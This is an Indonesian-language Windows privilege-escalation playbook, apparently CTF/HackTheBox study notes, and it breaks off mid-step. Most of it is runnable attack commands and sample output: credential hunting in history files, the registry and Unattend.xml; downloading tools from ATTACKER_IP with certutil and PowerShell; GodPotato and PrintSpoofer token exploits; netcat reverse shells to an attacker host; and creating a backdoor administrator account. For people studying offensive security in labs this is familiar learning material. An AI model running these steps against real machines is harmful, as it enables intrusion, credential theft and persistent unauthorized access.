dir /s /b *password* *cred* *secret* *config* 2>nul

REM Search text
findstr /si password *.xml *.ini *.txt *.config 2>nul

REM PowerShell history
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul

REM Credential Manager
cmdkey /list

REM Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## Scheduled Tasks

```cmd
REM Query tasks
schtasks /query /fo LIST /v

REM Trigger specific task
schtasks /run /tn "\TASKNAME"
```

---

## File ACL

```cmd
REM Check ACL
icacls "C:\Path\To\File.exe"

REM Directory
icacls "C:\Path\To\Directory"

REM AccessChk
accesschk.exe -qv "C:\Path\To\File.exe"
```

---

## Potato

```cmd
REM Verify privilege first
whoami /priv

REM PrintSpoofer
.\PrintSpoofer.exe -i -c cmd.exe

REM GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

## SYSTEM verification

```cmd
REM Verify username
whoami

REM Verify all token information
whoami /all

REM Expected
REM nt authority\system
```

---

# 🧭 BAGIAN 18 — CROSS-WORKFLOW LINKS

## ← File 44 — Linux PrivEsc

```text
Linux PrivEsc
      ↓
permission
      ↓
misconfiguration
      ↓
privilege boundary
```

File 45 memakai filosofi yang sama:

```text
Windows PrivEsc
      ↓
ACL
Token
Service
Registry
Scheduled Task
Credential
Patch
```

---

## → File 46 — Token Impersonation

File 45 memperkenalkan:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
Potato family
```

File 46 dapat menjadi deep-dive:

```text
Token model
Impersonation levels
Primary vs impersonation token
Named pipe abuse
COM/RPC abuse
JuicyPotato
PrintSpoofer
GodPotato
RoguePotato
SweetPotato
```

---

## → File 47 — Sudo / SUID / Capabilities

Konsep yang dipelajari di Linux:

```text
SUID
sudo
capabilities
```

dapat dibandingkan dengan Windows:

```text
Service ACL
Token Privilege
NTFS ACL
Registry permission
Scheduled Task
```

---

## ↔ File 41 — NTLM Relay

Credential material yang diperoleh dari Windows dapat menghubungkan workflow:

```text
Windows compromise
       ↓
NTLM material
       ↓
SMB / authentication
       ↓
Relay / lateral movement
```

---

## ↔ File 35 — AD Initial Enumeration

Jika:

```text
echo %USERDNSDOMAIN%
```

menghasilkan domain:

```text
corp.local
```

maka machine kemungkinan berada dalam Active Directory environment.

Lanjutkan:

```text
Local PrivEsc
       ↓
Domain context
       ↓
AD Enumeration
       ↓
Kerberos / LDAP / SMB
       ↓
Lateral Movement
```

---

# 🧩 MASTER WINDOWS PRIVESC MODEL

Jangan menghafal puluhan command.

Hafalkan primitive:

```text
┌─────────────────────────────────────────┐
│         WINDOWS PRIVESC PRIMITIVES      │
├─────────────────────────────────────────┤
│ READ                                     │
│ ├── Registry                             │
│ ├── Credentials                          │
│ ├── SAM                                   │
│ └── Config                               │
│                                         │
│ WRITE                                    │
│ ├── Service binary                       │
│ ├── Service config                       │
│ ├── Scheduled task                       │
│ ├── Registry                             │
│ └── DLL search directory                 │
│                                         │
│ EXECUTE                                  │
│ ├── SYSTEM service                       │
│ ├── scheduled task                       │
│ ├── MSI                                   │
│ └── privileged process                    │
│                                         │
│ IMPERSONATE                              │
│ ├── SeImpersonatePrivilege               │
│ └── SeAssignPrimaryTokenPrivilege        │
│                                         │
│ INJECT                                   │
│ ├── DLL hijacking                        │
│ ├── process abuse                        │
│ └── token manipulation                    │
│                                         │
│ INHERIT                                  │
│ ├── Service context                      │
│ ├── Scheduled Task context               │
│ └── Privileged process context           │
│                                         │
│ DELEGATE                                 │
│ ├── Service ACL                          │
│ ├── Registry permissions                 │
│ └── File ACL                             │
└─────────────────────────────────────────┘
```

---

# 🚦 FINAL WINDOWS PRIVESC FLOW

```text
                 LOW PRIV SHELL
                       │
                       ▼
                WHOAMI /ALL
                       │
                       ▼
                WHOAMI /PRIV
                       │
       ┌───────────────┼────────────────┐
       │               │                │
       ▼               ▼                ▼
 SeImpersonate       SeDebug       SeBackup/Restore
       │               │                │
       ▼               ▼                ▼
    Potato          Process         Hive / File
     Family          Abuse             Access
       │               │                │
       └───────────────┴────────┬───────┘
                                │
                                ▼
                            WINPEAS
                                │
             ┌──────────────────┼─────────────────┐
             │                  │                 │
             ▼                  ▼                 ▼
          SERVICE            REGISTRY          CREDS
             │                  │                 │
             ▼                  ▼                 ▼
        Unquoted            AIE/Autorun       History
        Weak ACL            Autologon          Config
        Writable EXE                           Manager
             │                  │                 │
             └──────────┬───────┴─────────────────┘
                        │
                        ▼
                SCHEDULED TASK
                        │
                        ▼
                    DLL/PATH
                        │
                        ▼
                  PATCH / CVE
                        │
                        ▼
                   UAC (if relevant)
                        │
                        ▼
                  VERIFY RESULT
                        │
               ┌────────┴────────┐
               │                 │
               ▼                 ▼
           SYSTEM             FAILED
               │                 │
               ▼                 ▼
             FLAG        BACK TO ENUMERATION
```

---

# ✅ FINAL MASTER CHECKLIST

```text
╔══════════════════════════════════════════════╗
║      WINDOWS PRIVESC MASTER CHECKLIST       ║
╚══════════════════════════════════════════════╝

IDENTITY
[ ] whoami
[ ] whoami /all
[ ] whoami /priv
[ ] whoami /groups

SYSTEM
[ ] systeminfo
[ ] OS version
[ ] Build number
[ ] Architecture
[ ] Hotfixes
[ ] Domain/workgroup

NETWORK
[ ] ipconfig /all
[ ] route print
[ ] netstat -ano
[ ] localhost-only services
[ ] hosts file
[ ] DNS cache

USERS/GROUPS
[ ] net user
[ ] local Administrators
[ ] Domain context
[ ] Interesting service accounts

SERVICES
[ ] Running services
[ ] SYSTEM services
[ ] Service paths
[ ] Unquoted paths
[ ] Weak service ACL
[ ] Writable service binary
[ ] SERVICE_CHANGE_CONFIG
[ ] Can service restart?

REGISTRY
[ ] AlwaysInstallElevated
[ ] Run / RunOnce
[ ] Winlogon
[ ] Autologon
[ ] Credential strings
[ ] Application settings

TOKENS
[ ] SeImpersonatePrivilege
[ ] SeAssignPrimaryTokenPrivilege
[ ] SeDebugPrivilege
[ ] SeBackupPrivilege
[ ] SeRestorePrivilege
[ ] SeTakeOwnershipPrivilege

CREDENTIALS
[ ] PowerShell history
[ ] cmdkey /list
[ ] Unattend.xml
[ ] web.config
[ ] application configs
[ ] Wi-Fi profiles
[ ] SAM
[ ] SYSTEM hive

SCHEDULED TASKS
[ ] Tasks running as SYSTEM
[ ] Binary path
[ ] Script path
[ ] Directory ACL
[ ] Trigger ability

DLL
[ ] Procmon
[ ] Missing DLL
[ ] Search path
[ ] Writable directory
[ ] Architecture
[ ] Export requirements

AUTOMATED
[ ] WinPEAS
[ ] Seatbelt
[ ] PowerUp
[ ] PrivescCheck
[ ] Watson/WES-NG

KERNEL
[ ] Build verified
[ ] Patch status
[ ] CVE applicability
[ ] PoC compatibility
[ ] Last resort only

VERIFY
[ ] whoami
[ ] whoami /all
[ ] Expected SYSTEM/Admin
[ ] Flag captured

CLEANUP
[ ] Remove payload
[ ] Restore modified service
[ ] Restore registry
[ ] Remove temporary accounts
[ ] Remove temporary files
[ ] Remove temporary listeners
```

---

# 🏁 END STATE

Workflow selesai ketika:

```cmd
REM Current identity
whoami
```

menghasilkan:

```text
nt authority\system
```

atau target challenge memang menganggap:

```text
BUILTIN\Administrator
```

sebagai privilege akhir.

Kemudian:

```cmd
REM Verify complete token information
whoami /all
```

dan ambil flag:

```cmd
REM Common HTB/CTF root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

# 🧠 ONE-LINE MEMORY

```text
WHOAMI → PRIVILEGES → SYSTEM/BUILD → WINPEAS → SERVICES → TOKENS → REGISTRY → CREDS → TASKS → DLL/PATH → PATCH/CVE → VERIFY SYSTEM
```

# 🎯 THE REAL SKILL

> **Windows Privilege Escalation bukan kemampuan menghafal Potato, service command, atau UAC bypass.**
> 
> Kemampuan sebenarnya adalah membaca hubungan:
> 
> ```text
> WHO CONTROLS IT?
>         ↓
> WHO EXECUTES IT?
>         ↓
> UNDER WHAT TOKEN?
>         ↓
> WHAT CAN I MODIFY?
>         ↓
> WHAT PRIVILEGE WILL THAT MODIFICATION INHERIT?
> ```
> 
> Jika jawabannya adalah:
> 
> ```text
> SYSTEM executes
> +
> I control the input
> =
> PrivEsc candidate
> ```
> 
> maka temuan tersebut layak diinvestigasi lebih lanjut.

---

# 🔗 FILE 45 COMPLETE

```text
44 — Linux PrivEsc
          │
          ▼
45 — Windows PrivEsc
          │
          ├──→ 46 — Token Impersonation
          │
          ├──→ 47 — Sudo/SUID/Capabilities Deep Dive
          │
          ├──→ 41 — NTLM Relay
          │
          └──→ 35 — AD Initial Enumeration
```

---

# [🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)

# Windows Privilege Escalation — Complete Interactive Decision Workflow

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL ✅** dan **OUTPUT GAGAL ❌**. Ikuti sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Asumsi:** Kamu sudah punya low-privilege shell di Windows target (dari SMB, WinRM, RDP, web exploit, dll.)

---

## 🔧 PRE-FLIGHT: Setup Environment

PowerShell

```
# Di Parrot — siapkan HTTP server untuk transfer tools
cd /opt/tools-windows   # atau folder tempat kamu simpan winpeas, dll
python3 -m http.server 8080

# Di shell Windows target — set variabel kerja
set LHOST=10.10.14.5
set LPORT=4445
mkdir C:\Temp 2>nul
cd C:\Temp
```

**Tools yang perlu disiapkan di Parrot sebelum mulai:**

Bash

```
# Cek ketersediaan tools
ls /opt/tools-windows/
# Harus ada: winPEASx64.exe, winPEASx86.exe, accesschk.exe,
#            PrintSpoofer.exe, GodPotato.exe, JuicyPotato.exe,
#            Seatbelt.exe, PowerUp.ps1, nc.exe

# Download jika belum ada:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI AWAL (WAJIB, LAKUKAN PERTAMA)

## ═══════════════════════════════════════

> **Tujuan:** Dalam 2 menit pertama, tentukan arah mana yang paling menjanjikan.

### Langkah 0.1 — Siapa Kita? (5 Command Wajib)

cmd

```
REM Command 1: Basic identity
whoami

REM Command 2: FULL info — groups, privileges, SID (PALING PENTING)
whoami /all

REM Command 3: Token privileges saja (untuk keputusan cepat)
whoami /priv

REM Command 4: Group membership
whoami /groups

REM Command 5: OS info ringkas
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

**OUTPUT BERHASIL ✅ — Privilege menarik terdeteksi:**

text

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**Interpretasi cepat `whoami /priv` — KEPUTUSAN LANGSUNG:**

|Privilege yang Terlihat|Tindakan Langsung|
|---|---|
|`SeImpersonatePrivilege Enabled`|**→ LANGSUNG ke Fase 3 (Potato Family)**|
|`SeAssignPrimaryTokenPrivilege Enabled`|**→ LANGSUNG ke Fase 3**|
|`SeDebugPrivilege Enabled`|**→ Fase 3.3 (LSASS Dump)**|
|`SeBackupPrivilege Enabled`|**→ Fase 3.4 (SAM Dump)**|
|`SeRestorePrivilege Enabled`|**→ Fase 3.4**|
|`SeTakeOwnershipPrivilege Enabled`|**→ Fase 3.5**|
|`SeLoadDriverPrivilege Enabled`|**→ Fase 9 (Kernel via Driver)**|
|Tidak ada privilege menarik|**→ Lanjut ke Fase 1 (WinPEAS)**|

**OUTPUT ✅ — Standard user tanpa privilege berbahaya:**

text

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeUndockPrivilege             Remove computer from dock      Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

➡️ Tidak ada privilege menarik → Lanjut ke **Langkah 0.2** lalu **Fase 1**

**OUTPUT ✅ — Sudah Administrator (tapi mungkin UAC):**

text

```
C:\Windows\system32>whoami /groups | findstr "Mandatory"
Mandatory Label\High Mandatory Level
```

➡️ Integrity Level **High** = sudah elevated, cukup untuk banyak hal  
➡️ Integrity Level **Medium** dengan group Administrators = UAC aktif → **Fase 8**

---

### Langkah 0.2 — Fingerprint OS & Domain

cmd

```
REM OS detail
systeminfo

REM Cara cepat: cek apakah domain joined
echo %USERDNSDOMAIN%
echo %USERDOMAIN%
echo %COMPUTERNAME%

REM Cek hostname
hostname
```

**OUTPUT BERHASIL ✅ — Domain environment:**

text

```
USERDNSDOMAIN = CORP.LOCAL
USERDOMAIN    = CORP
COMPUTERNAME  = WEB01
```

➡️ **PENTING:** Ini domain-joined machine. Catat info ini:

cmd

```
REM Simpan ke file untuk referensi
echo Domain: %USERDNSDOMAIN% > C:\Temp\target_info.txt
echo Hostname: %COMPUTERNAME% >> C:\Temp\target_info.txt
echo User: %USERNAME% >> C:\Temp\target_info.txt
```

➡️ Setelah dapat SYSTEM/Admin lokal, pivot ke **[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)**

**OUTPUT BERHASIL ✅ — Standalone/Workgroup:**

text

```
USERDNSDOMAIN = (kosong atau sama dengan hostname)
USERDOMAIN    = WEB01
```

➡️ Standalone machine, fokus local privesc saja.

**OUTPUT — OS Version untuk referensi exploit:**

text

```
OS Name:   Microsoft Windows Server 2019 Standard
OS Version: 10.0.17763 N/A Build 17763
System Type: x64-based PC
```

**Tabel Build Number → Nama Windows:**

|Build|Nama|
|---|---|
|7601|Windows 7 / Server 2008 R2|
|9200|Windows 8 / Server 2012|
|9600|Windows 8.1 / Server 2012 R2|
|10240|Windows 10 1507|
|14393|Windows 10 1607 / Server 2016|
|17763|Windows 10 1809 / Server 2019|
|19041|Windows 10 2004|
|19042|Windows 10 20H2|
|20348|Server 2022|
|22000+|Windows 11|

---

### Langkah 0.3 — Transfer Tools ke Target

cmd

```
REM Method 1: certutil (paling reliable, ada di semua Windows)
certutil -urlcache -split -f http://ATTACKER_IP:8080/winPEASx64.exe C:\Temp\winpeas.exe

REM Method 2: PowerShell Invoke-WebRequest
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/winPEASx64.exe' -OutFile 'C:\Temp\winpeas.exe'"

REM Method 3: PowerShell WebClient (jika IWR diblokir)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/winPEASx64.exe','C:\Temp\winpeas.exe')"

REM Method 4: Dari SMB share (jika HTTP diblokir)
REM Di Parrot: python3 /opt/impacket/examples/smbserver.py share /opt/tools-windows -smb2support
copy \\ATTACKER_IP\share\winPEASx64.exe C:\Temp\winpeas.exe
```

**OUTPUT BERHASIL ✅:**

text

```
C:\Temp>dir winpeas.exe
09/01/2024  10:23 AM         2,387,456 winpeas.exe
```

**OUTPUT GAGAL ❌ — Access denied / blocked:**

text

```
certutil: -URLCache command FAILED: 0x80070005 (WIN32: 5 ERROR_ACCESS_DENIED)
```

➡️ Coba path alternatif:

cmd

```
REM Coba write ke direktori lain
certutil -urlcache -split -f http://ATTACKER_IP:8080/winPEASx64.exe %APPDATA%\winpeas.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/winPEASx64.exe %PUBLIC%\winpeas.exe

REM Cek direktori mana yang writable
echo test > C:\Temp\test.txt
echo test > C:\Windows\Temp\test.txt
echo test > %APPDATA%\test.txt
```

**OUTPUT GAGAL ❌ — HTTP outbound diblokir:**

text

```
ERROR_INTERNET_CANNOT_CONNECT
```

➡️ Coba SMB atau encode ke base64:

Bash

```
# Di Parrot: encode tools ke base64
base64 -w 0 winPEASx64.exe > winpeas_b64.txt
# Paste isi file ke PowerShell di target:
# [IO.File]::WriteAllBytes("C:\Temp\winpeas.exe",[Convert]::FromBase64String("BASE64STRING"))
```

**Google search jika masih gagal:** `"windows file transfer without internet certutil blocked"` atau `"powershell download file restricted environment"`

---

## ═══════════════════════════════════════

## FASE 1: AUTOMATED ENUMERATION (WinPEAS)

## ═══════════════════════════════════════

> **Tujuan:** Jalankan WinPEAS untuk menemukan semua vektor potensial, lalu analisis output-nya.

### Langkah 1.1 — Jalankan WinPEAS

cmd

```
REM Command 1: Jalankan dan simpan output (recommended)
C:\Temp\winpeas.exe > C:\Temp\winpeas_output.txt 2>&1

REM Baca output setelah selesai
type C:\Temp\winpeas_output.txt | more

REM Command 2: Jalankan tanpa simpan (langsung baca)
C:\Temp\winpeas.exe

REM Command 3: Jalankan modul spesifik saja (lebih cepat)
C:\Temp\winpeas.exe systeminfo userinfo processinfo servicesinfo applicationsinfo
```

**OUTPUT BERHASIL ✅ — WinPEAS berjalan normal:**

text

```
...
[+] SYSTEM INFORMATION
[?] Check for vulnerabilities for the OS version with the %winpeas_path%\CVEs folder
...
[!] SeImpersonatePrivilege is enabled!
...
[+] Modifiable Services
...
[!] C:\Program Files\Vuln Service\service.exe (Users [AllAccess])
```

**Cara baca WinPEAS — FOKUS ke bagian ini dulu:**

|Section|Yang Dicari|Action|
|---|---|---|
|Token Privileges|`SeImpersonatePrivilege`, `SeDebugPrivilege`|→ Fase 3|
|Modifiable Services|Path yang bisa ditulis|→ Fase 4|
|Unquoted Service Paths|Path dengan spasi tanpa quote|→ Fase 4.1|
|AlwaysInstallElevated|`1` di HKLM dan HKCU|→ Fase 5|
|AutoLogon|Username + Password|→ Langsung test reuse|
|PowerShell History|Password dalam command|→ Reuse credentials|
|Scheduled Tasks|SYSTEM task dengan writable binary|→ Fase 6|
|DLL Hijacking|Missing DLL dalam writable path|→ Fase 7|
|Credentials|Password dalam file/registry|→ Test reuse|
|Kernel Vulns|CVE-XXXX-XXXX|→ Fase 9|

**OUTPUT GAGAL ❌ — WinPEAS diblokir AV:**

text

```
Access is denied.
```

atau WinPEAS langsung dihapus/tidak bisa dieksekusi.

➡️ Gunakan tool alternatif:

PowerShell

```
REM Seatbelt (lebih stealth)
C:\Temp\Seatbelt.exe -group=all

REM PowerUp (PowerShell-based)
powershell -ep bypass -c ". C:\Temp\PowerUp.ps1; Invoke-AllChecks"

REM PrivescCheck
powershell -ep bypass -c ". C:\Temp\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

REM Manual enumeration saja (ke Fase 2)
```

---

### Langkah 1.2 — Analisis Output WinPEAS

cmd

```
REM Cari findings penting dalam output
REM (Lakukan di PowerShell untuk filter lebih mudah)
powershell -c "Get-Content C:\Temp\winpeas_output.txt | Select-String -Pattern 'SeImpersonate|AlwaysInstall|Unquoted|Modifiable|AutoLogon|password|Password' -CaseSensitive:$false"
```

**OUTPUT BERHASIL ✅ — Multiple findings:**

text

```
[!] SeImpersonatePrivilege is enabled!
[!] AlwaysInstallElevated is enabled
[!] Unquoted service path: C:\Program Files\Vuln Service\service.exe
AutoLogon: admin:P@ssw0rd123
```

➡️ **Prioritas berdasarkan temuan:**

1. Credential (AutoLogon/Registry) → Test dulu, mungkin langsung dapat admin
2. SeImpersonatePrivilege → Fase 3 (cepat dan reliable)
3. AlwaysInstallElevated → Fase 5
4. Unquoted service path → Fase 4.1
5. Modifiable service → Fase 4.2

**OUTPUT ✅ — Sedikit findings / tidak jelas:**

➡️ Lanjut ke **Fase 2** untuk manual enumeration yang lebih detail.

---

## ═══════════════════════════════════════

## FASE 2: MANUAL ENUMERATION DETAIL

## ═══════════════════════════════════════

> Jalankan ini jika WinPEAS tidak memberikan hasil jelas, atau untuk validasi temuan WinPEAS.

### Langkah 2.1 — Credential Hunting (Lakukan Pertama)

cmd

```
REM PowerShell history — SERING berisi password!
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul

REM Credential Manager
cmdkey /list

REM AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "password username"

REM Cari password dalam file
findstr /si "password" C:\*.txt C:\*.xml C:\*.config C:\*.ini 2>nul | head -30
dir /s /b *password* *cred* *secret* 2>nul

REM Unattended install files (sering ada password!)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\System32\Sysprep\sysprep.xml 2>nul

REM IIS config (jika ada web server)
type C:\inetpub\wwwroot\web.config 2>nul
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
C:\Windows\Panther\Unattend.xml:
<Password>
    <Value>QWRtaW5AMTIz</Value>  <!-- Base64 encoded! -->
    <PlainText>false</PlainText>
</Password>
<Username>Administrator</Username>
```

➡️ Decode base64:

Bash

```
# Di Parrot
echo "QWRtaW5AMTIz" | base64 -d
# Output: Admin@123
```

➡️ Test langsung dari Parrot:

Bash

```
# Test credential yang ditemukan
nxc smb $TARGET -u "Administrator" -p "Admin@123"
evil-winrm -i $TARGET -u "Administrator" -p "Admin@123"
```

**OUTPUT BERHASIL ✅ — Credential Manager punya entries:**

text

```
Currently stored credentials:
    Target: LegacyGeneric:target=TERMSRV/192.168.1.100
    Type: Generic
    User: CORP\alice
    
    Target: Domain:target=CORP.LOCAL
    Type: Domain Password
    User: svc_backup
```

➡️ Coba `runas /savecred`:

cmd

```
runas /savecred /user:CORP\alice "cmd.exe /c whoami > C:\Temp\whoami_result.txt"
type C:\Temp\whoami_result.txt
```

**OUTPUT BERHASIL ✅ — PowerShell history berisi kredensial:**

text

```
net use \\fileserver\share /user:admin Password123!
Invoke-WebRequest -Credential (Get-Credential)
$pass = ConvertTo-SecureString "Sup3rS3cr3t!" -AsPlainText -Force
```

➡️ Simpan semua password yang ditemukan, test ke semua service!

---

### Langkah 2.2 — Service Enumeration Manual

cmd

```
REM Lihat semua service + path + account
wmic service get name,pathname,startmode,startname 2>nul

REM Filter service yang TIDAK ada di Windows directory (lebih likely custom/vuln)
wmic service get name,pathname,startmode,startname 2>nul | findstr /i /v "C:\Windows\\"

REM Cek service yang bisa di-modify oleh current user
powershell -c "Get-CimInstance Win32_Service | Select-Object Name, PathName, StartName, StartMode | Where-Object {$_.StartName -ne 'LocalSystem' -or $_.PathName -notlike '*Windows*'}"
```

**OUTPUT BERHASIL ✅ — Ada service dengan path mencurigakan:**

text

```
Name       PathName                                        StartName    StartMode
----       --------                                        ---------    ---------
VulnSvc    C:\Program Files\Vuln App\service.exe           LocalSystem  Auto
BackupSvc  C:\Backup Tool\backup service\backup.exe        LocalSystem  Auto
```

➡️ Perhatikan:

- `BackupSvc` → path ada spasi dan tidak di-quote = **Unquoted Service Path** → Fase 4.1
- `VulnSvc` → cek permission binary-nya → Fase 4.2

**OUTPUT BERHASIL ✅ — Service dengan account rendah:**

text

```
WebService  C:\WebApp\service.exe  NT AUTHORITY\NetworkService  Auto
```

➡️ `NetworkService` biasanya punya `SeImpersonatePrivilege` → Fase 3

---

### Langkah 2.3 — Scheduled Task Enumeration

cmd

```
REM Semua scheduled task
schtasks /query /fo LIST /v 2>nul > C:\Temp\tasks.txt
type C:\Temp\tasks.txt | findstr /i "task to run\|run as user\|status"

REM Filter task yang dijalankan sebagai SYSTEM
schtasks /query /fo LIST /v 2>nul | findstr /i "SYSTEM\|task to run"
```

**OUTPUT BERHASIL ✅ — Task dengan SYSTEM + writable binary:**

text

```
TaskName:   \BackupTask
Task To Run: C:\Backup\backup.exe
Run As User: SYSTEM
Status: Running
```

➡️ Cek permission binary:

cmd

```
icacls "C:\Backup\backup.exe"
```

text

```
C:\Backup\backup.exe BUILTIN\Users:(M)
                     NT AUTHORITY\SYSTEM:(F)
```

➡️ `(M)` = Modify = kita bisa replace! → **Fase 6**

---

### Langkah 2.4 — Registry Checks

cmd

```
REM AlwaysInstallElevated (dua-duanya harus 1)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul

REM Autorun entries (mungkin ada binary writable)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul

REM Cari password dalam registry
reg query HKLM /f password /t REG_SZ /s 2>nul | head -40
reg query HKCU /f password /t REG_SZ /s 2>nul | head -40
```

**OUTPUT BERHASIL ✅ — AlwaysInstallElevated aktif:**

text

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

➡️ Keduanya `0x1` = **Exploitable!** → **Fase 5**

**OUTPUT GAGAL ❌ — Key tidak ada:**

text

```
ERROR: The system was unable to find the specified registry key or value.
```

➡️ AlwaysInstallElevated tidak dikonfigurasi. Skip ke vector lain.

---

### Langkah 2.5 — Network & Process Recon

cmd

```
REM Service yang hanya listen di localhost (mungkin exploitable dari dalam)
netstat -ano | findstr "127.0.0.1"

REM Process yang berjalan sebagai SYSTEM (target untuk DLL hijack, dll.)
tasklist /v 2>nul | findstr /i "SYSTEM"

REM Installed software (cari versi lama yang vuln)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr "DisplayName DisplayVersion"
```

**OUTPUT BERHASIL ✅ — Port lokal menarik:**

text

```
TCP    127.0.0.1:8080    0.0.0.0:0    LISTENING    1234
TCP    127.0.0.1:3306    0.0.0.0:0    LISTENING    5678
```

➡️ Port 8080 di localhost = ada web app internal → coba akses dengan curl/browser  
➡️ Port 3306 = MySQL lokal → coba koneksi tanpa password atau dengan credential yang ditemukan

cmd

```
REM Akses web app internal
curl http://127.0.0.1:8080/
powershell -c "Invoke-WebRequest http://127.0.0.1:8080/ -UseBasicParsing"

REM Coba MySQL lokal
REM Transfer mysql.exe ke target atau gunakan python
```

---

## ═══════════════════════════════════════

## FASE 3: TOKEN PRIVILEGE EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika:** `whoami /priv` menampilkan privilege berbahaya.  
> **Paling sering di:** IIS web shell, SQL Server xp_cmdshell, service account.

### Langkah 3.1 — Konfirmasi Privilege

cmd

```
whoami /priv
```

**OUTPUT yang dicari:**

text

```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
```

atau

text

```
SeAssignPrimaryTokenPrivilege Replace a process level token               Enabled
```

➡️ **Jika ada salah satu = JACKPOT!** Lanjut ke Langkah 3.2

---

### Langkah 3.2 — Pilih Potato yang Tepat

cmd

```
REM Cek OS build dulu untuk pilih tool yang tepat
systeminfo | findstr "OS Version"
```

**Tabel Pilihan Potato Berdasarkan OS:**

|OS / Build|Tool Prioritas|Alternatif|
|---|---|---|
|Windows 10 1809+ / Server 2019+|**GodPotato**|PrintSpoofer|
|Windows 10 / Server 2016|**PrintSpoofer**|GodPotato|
|Windows Server 2012/2016 (IIS context)|**PrintSpoofer**|RoguePotato|
|Windows 7 / Server 2008 R2 / 2012|**JuicyPotato**|-|
|Semua modern (jika yang lain gagal)|**RoguePotato**|SweetPotato|

---

### Langkah 3.3 — GodPotato (Rekomendasi untuk Modern Windows)

cmd

```
REM Step 1: Transfer GodPotato
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe C:\Temp\GodPotato.exe

REM Step 2: TEST DULU dengan whoami (JANGAN langsung reverse shell)
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] CombaseModule: 0x140708049272832
[*] PoC CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
[*] CreateNamedPipe \\.\pipe\godpotato-...
[*] Trigger RPCSS success
[*] PIPE ActiveXSrv
[*] Token Impersonation success!
[*] cmd : nt authority\system
```

➡️ Output `nt authority\system` = **BERHASIL!**

cmd

```
REM Step 3: Setup listener di Parrot
# nc -lvnp 4445

REM Step 4: Eksekusi reverse shell
C:\Temp\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe ATTACKER_IP 4445 -e cmd.exe"
```

Atau langsung tambah user admin:

cmd

```
REM Cara paling simpel: tambah user admin langsung
C:\Temp\GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add"

REM Verifikasi
net user hacker
net localgroup administrators
```

**OUTPUT BERHASIL ✅ — User dibuat:**

text

```
The command completed successfully.

User accounts for \\WEB01
-------------------------------------------------------------------------------
Administrator    Guest    hacker    webuser
```

➡️ Login via RDP atau WinRM:

Bash

```
# Dari Parrot
evil-winrm -i $TARGET -u "hacker" -p "P@ssw0rd123!"
xfreerdp /u:hacker /p:P@ssw0rd123! /v:$TARGET
```

**OUTPUT GAGAL ❌ — GodPotato gagal:**

text

```
[-] Token Impersonation failed
```

atau tidak ada output sama sekali.

➡️ Coba **PrintSpoofer**:

cmd

```
certutil -urlcache -split -f http://ATTACKER_IP:8080/PrintSpoofer64.exe C:\Temp\PrintSpoofer.exe

REM Test
C:\Temp\PrintSpoofer.exe -i -c "cmd /c whoami"
```

**OUTPUT BERHASIL ✅ — PrintSpoofer:**

text

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

cmd

```
REM Eksekusi reverse shell via PrintSpoofer
C:\Temp\PrintSpoofer.exe -i -c "cmd /c C:\Temp\nc.exe ATTACKER_IP 4445 -e cmd.exe"
```

**OUTPUT GAGAL ❌ — PrintSpoofer juga gagal:**

text

```
[-] CreateFile failed: 2
```

➡️ Coba **JuicyPotato** (untuk Windows lama):

cmd

```
